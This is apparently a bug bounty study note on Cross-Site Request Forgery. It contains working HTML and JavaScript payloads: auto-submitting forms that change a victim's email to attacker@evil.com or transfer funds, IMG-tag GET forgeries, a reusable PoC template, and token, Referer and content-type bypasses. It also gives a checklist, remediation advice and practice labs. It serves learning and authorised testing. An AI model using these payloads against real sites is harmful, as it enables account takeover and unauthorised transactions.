# CSRF — Cross-Site Request Forgery

> **OWASP:** A01:2025 — Broken Access Control  
> **Severity:** Medium/High — scales with action impact  
> **Bounty Range:** $200 – $15,000+ (Critical on financial/admin actions)

---

## What is CSRF?

CSRF tricks a victim's browser into making an authenticated request to a target site without their knowledge. The browser automatically attaches session cookies — so the server thinks the request is legitimate.

**Key insight:** The server trusts the browser. CSRF abuses that trust.

---

## How CSRF Works (3 Steps)

```
1. Victim logs into bank.com — browser stores session cookie
2. Victim visits attacker's malicious page (or clicks email link)
3. Malicious page auto-submits a request to bank.com
   → Browser attaches session cookie automatically
   → Bank processes it as a legitimate request
```

---

## 5 Attack Types

### 01 · Change Email / Password
```html
<!-- Attacker's malicious page — auto-submits on load -->
<form action="https://target.com/account/email" method="POST" id="csrf">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.getElementById('csrf').submit();</script>

Test: POST /account/email, /account/password
Look for: Missing CSRF token in form
```

### 02 · Fund Transfer
```html
<form action="https://bank.com/transfer" method="POST" id="csrf">
  <input type="hidden" name="to" value="attacker_account">
  <input type="hidden" name="amount" value="5000">
</form>
<script>document.getElementById('csrf').submit();</script>

Impact: Critical on financial platforms
Check: SameSite cookie attribute — None = vulnerable
```

### 03 · Admin Action Forgery
```html
<!-- One-click attack via IMG tag (GET-based CSRF) -->
<img src="https://target.com/admin/promote?user=attacker&role=admin">

<!-- Embed in forum post, email, anywhere victim might see -->

Test: /admin/adduser, /admin/settings, /admin/delete
Impact: Critical — affects all users
```

### 04 · OAuth State Parameter Missing
```
Normal OAuth flow:
GET /oauth/authorize?client_id=X&state=RANDOM_VALUE

If state parameter is missing or not validated:
1. Attacker initiates OAuth → gets code
2. Drops at /oauth/callback?code=ATTACKER_CODE (no state check)
3. Victim's browser completes attacker's OAuth flow
4. Attacker's account linked to victim's session

Result: Full account takeover via CSRF + OAuth
```

### 05 · GET-Based State Changes (Easy Win)
```
Any state-changing action via GET request is trivially exploitable:

<img src="https://target.com/logout">
<img src="https://target.com/delete-account?confirm=yes">
<img src="https://target.com/unsubscribe?email=victim@mail.com">

These can be embedded anywhere — forum posts, emails, ads
```

---

## CSRF PoC Template

```html
<!DOCTYPE html>
<html>
<head><title>CSRF PoC</title></head>
<body onload="document.getElementById('csrf').submit()">
  <form id="csrf" action="https://TARGET.com/account/email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
    <!-- Add all required POST parameters here -->
  </form>
</body>
</html>
```

---

## Bypass Techniques

### Token Not Validated
```
Remove the CSRF token entirely:
Before: POST /email  Body: email=x&csrf_token=abc123
After:  POST /email  Body: email=x

If it works → CSRF token not validated server-side
```

### Token Tied to Session, Not Request
```
Use your own valid CSRF token in the request:
Before: Victim's token = abc123
After:  Replace with your own token = xyz789

If it works → token not tied to specific user/session
```

### Change POST to GET
```
Some endpoints accept both methods:
Before: POST /transfer  Body: to=attacker&amount=5000
After:  GET  /transfer?to=attacker&amount=5000

If GET works → GET-based CSRF possible
```

### JSON CSRF (Content-Type Bypass)
```javascript
// If endpoint accepts text/plain with JSON body:
fetch('https://target.com/api/settings', {
  method: 'POST',
  body: '{"email":"attacker@evil.com"}',
  // No Content-Type: application/json → might bypass CORS
})
```

### Referer Header Bypass
```
If only checking Referer header:

Add legit domain as path: attacker.com/target.com
Use null Referer: <iframe sandbox="allow-scripts" src="...">
```

---

## Checklist

```
☐  Check every state-changing request for CSRF token
☐  Test if token is validated — remove it, does it still work?
☐  Try using your own valid token in victim's request
☐  Check SameSite cookie attribute — None = vulnerable
☐  Try converting POST to GET — does server still process it?
☐  Check OAuth flows — state param present & validated?
☐  Test Referer/Origin header validation on sensitive endpoints
☐  Look for JSON endpoints — try text/plain content-type bypass
```

---

## Impact by Action

| Action | Severity |
|--------|----------|
| Fund transfer | Critical |
| Email/password change | High |
| Admin privilege escalation | Critical |
| OAuth account linking | Critical |
| Delete account | High |
| Logout/session termination | Low |
| Profile picture change | Low |

---

## Report Template

```
Title: CSRF on Email Change — Account Takeover

Severity: High (CVSS 8.0)

Endpoint: POST /account/email

Steps to Reproduce:
1. Log in as victim user
2. Open attacker's PoC page (HTML attached)
3. PoC auto-submits POST /account/email with new email
4. Victim's email changed to attacker@evil.com
5. Attacker uses "forgot password" to take over account

Proof of Concept:
[Attach CSRF PoC HTML file]

Impact:
Full account takeover — attacker changes email,
triggers password reset, gains complete access.

Remediation:
- Implement CSRF tokens (unique, unpredictable, per-session)
- Set SameSite=Strict or SameSite=Lax on session cookies
- Validate Origin/Referer headers for state-changing requests
```

---

## Practice Labs

- [PortSwigger CSRF Labs](https://portswigger.net/web-security/csrf) — 12 free labs
- [DVWA CSRF Module](https://github.com/digininja/DVWA)
- [HackTheBox Web Challenges](https://www.hackthebox.com)

---

*Daily Bug Bounty notes — follow for more.*
